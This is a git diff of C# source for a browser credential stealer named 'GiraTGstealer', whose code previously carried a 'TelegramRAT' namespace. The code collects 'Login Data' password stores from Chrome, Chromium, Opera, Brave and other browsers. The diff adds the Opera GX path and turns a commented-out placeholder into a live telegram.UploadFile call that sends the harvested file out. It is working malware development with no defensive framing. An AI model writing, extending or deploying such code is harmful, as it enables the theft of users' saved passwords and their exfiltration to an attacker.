@@ -5,7 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using TelegramRAT;
+using GiraTGstealer.stealer;
 
 namespace GiraTGstealer
 {
@@ -25,6 +25,7 @@ namespace GiraTGstealer
                 lad + "Google(x86)\\Chrome" + ud,
                 lad + "Chromium" + ud,
                 ad + "Opera Software\\Opera Stable\\Login Data",
+                ad + "Opera Software\\Opera GX Stable\\Login Data",
                 lad + "BraveSoftware\\Brave-Browser" + ud,
                 lad + "Epic Privacy Browser" + ud,
                 lad + "Amigo" + ud,
@@ -93,7 +94,7 @@ namespace GiraTGstealer
             }
 
             File.WriteAllText(filename, output);
-            //Upload File telegram
+            telegram.UploadFile(filename, true);
         }
     }
 }
